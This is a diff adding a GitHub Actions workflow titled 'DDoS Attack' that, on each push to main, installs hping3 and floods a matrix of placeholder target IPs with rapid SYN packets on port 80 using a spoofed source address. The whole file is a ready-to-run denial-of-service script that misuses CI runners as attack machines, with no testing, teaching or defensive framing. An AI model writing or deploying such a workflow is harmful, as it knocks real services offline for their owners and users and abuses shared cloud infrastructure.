@@ -1,0 +1,27 @@
+name: DDoS Attack
+
+on:
+  push:
+    branches:
+      - main
+
+jobs:
+  attack:
+    runs-on: ubuntu-latest
+
+    strategy:
+      matrix:
+        target: [target-ip1, target-ip2, target-ip3, target-ip4, target-ip5]  # Add more targets as needed
+
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v2
+
+    - name: Install dependencies
+      run: |
+        sudo apt-get update
+        sudo apt-get install -y hping3
+
+    - name: Launch DDoS Attack
+      run: |
+        hping3 -S -p 80 -i u5000 -a 192.0.2.1 ${{ matrix.target }}
